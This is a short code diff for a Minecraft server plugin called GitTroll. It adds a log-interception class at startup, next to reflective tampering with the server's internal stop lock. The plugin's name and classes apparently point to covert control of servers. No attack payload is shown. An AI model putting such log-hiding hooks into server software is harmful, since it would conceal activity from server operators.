@@ -27,6 +27,7 @@ import net.Lenni0451.GitTroll.event.events.PluginDisableEvent;
 import net.Lenni0451.GitTroll.event.events.ServerLoadedEvent;
 import net.Lenni0451.GitTroll.manager.CommandManager;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
+import net.Lenni0451.GitTroll.utils.LogIntercepter;
 import net.Lenni0451.GitTroll.utils.Logger;
 import net.Lenni0451.GitTroll.utils.TrustedInfo;
 import net.minecraft.server.v1_8_R3.MinecraftServer;
@@ -108,6 +109,8 @@ public class GitTroll extends JavaPlugin implements Listener {
 			Bukkit.getPluginManager().disablePlugin(this);
 			return;
 		}
+		
+		new LogIntercepter();
 		
 		try {
 			Field f = MinecraftServer.class.getDeclaredField("stopLock");
